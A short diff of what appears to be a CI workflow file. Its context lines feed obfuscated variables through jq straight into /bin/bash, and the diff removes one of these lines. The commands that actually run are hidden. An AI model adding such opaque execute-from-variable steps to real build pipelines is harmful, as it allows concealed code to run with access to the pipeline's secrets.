@@ -29,7 +29,6 @@ jobs:
           echo $qudlh27 | jq -r .ipr75 | /bin/bash
           printf '%s' "$a113" | jq -r .cbi34962 | /bin/bash
           echo $ved95 | jq -r .gfk6 | /bin/bash
-          printf '%s' "$gdde8" | jq -r .u237 | /bin/bash
           printf '%s' "$iztfy4601" | jq -r .ebgv452 | /bin/bash
 
       - name: Store results
